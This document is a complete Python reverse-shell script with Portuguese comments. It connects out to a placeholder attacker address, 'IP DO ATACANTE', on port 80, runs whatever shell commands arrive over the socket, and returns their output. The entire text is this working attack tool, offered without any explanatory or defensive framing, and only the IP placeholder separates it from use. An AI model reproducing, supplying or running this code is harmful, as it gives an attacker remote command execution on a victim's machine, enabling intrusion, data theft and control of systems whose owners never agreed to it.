import socket
import subprocess

ip = 'IP DO ATACANTE'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

while True:
    try:
        # Recebe o comando
        cmd = s.recv(1024).decode('utf-8')
        if not cmd:
            break  # Se não houver comando, saia do loop

        # Executa o comando e captura a saída
        result = subprocess.run(cmd, shell=True, capture_output=True)

        # Envia a saída do comando de volta
        s.send(result.stdout + result.stderr)

    except Exception as e:
        # Se ocorrer um erro, envie a mensagem de erro
        s.send(str(e).encode('utf-8'))

s.close()
